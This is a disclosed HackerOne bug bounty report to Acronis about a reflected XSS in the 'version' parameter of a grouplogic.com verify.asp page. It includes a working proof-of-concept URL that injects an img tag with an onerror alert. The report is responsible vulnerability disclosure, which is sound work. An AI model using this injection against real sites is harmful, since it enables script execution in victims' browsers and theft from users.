# Reflected XSS on http://www.grouplogic.com/files/glidownload/verify.asp

## Report Details
- **Report ID**: 859395
- **URL**: https://hackerone.com/reports/859395
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-04-25T21:20:25.180Z
- **Disclosed**: 2021-04-13T13:23:29.831Z

## Reporter
- **Username**: ali
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Hello there,
I hope you are well!

As I see, Group Logic is your subsidary and www.grouplogic.com is a managed website by Acronis.
{F803772}

I found a reflected xss on http://www.grouplogic.com/
PoC: http://www.grouplogic.com/files/glidownload/verify.asp?version=AC12%27%3E%3Cimg%20src=v%20onerror=alert(document.domain)%3E

## Impact

Reflected XSS

Best Regards,
@mygf

## Attachments
- 1.png
